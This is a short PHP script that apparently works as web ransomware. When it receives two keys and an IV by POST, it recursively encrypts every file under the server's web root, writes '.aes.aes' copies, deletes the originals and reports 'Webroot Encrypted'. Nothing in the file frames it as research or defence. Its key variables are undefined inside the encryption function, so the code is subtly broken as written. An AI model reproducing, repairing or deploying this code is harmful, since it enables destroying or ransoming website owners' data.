<?php
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    }
    else if( $action == 'decrypt' ){
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

function encfile($filename){
	if (strpos($filename, '.aes.aes') !== false) {
    return;
	}
	$decrypted = file_get_contents($filename);
	$encrypted = encrypt_decrypt('encrypt', $decrypted, $key1, $iv);
	$encrypted2 = encrypt_decrypt('encrypt', $encrypted, $key2, $iv);
	file_put_contents($filename.".aes.aes", $encrypted2);
	unlink($filename);
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			}else {
				encfile($dir."/".$file);
		}
	}
}

$key1 = $_POST['key1'];
$key2 = $_POST['key2'];
$iv = $_POST['iv'];

if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
	echo "Webroot Encrypted";
}
?>
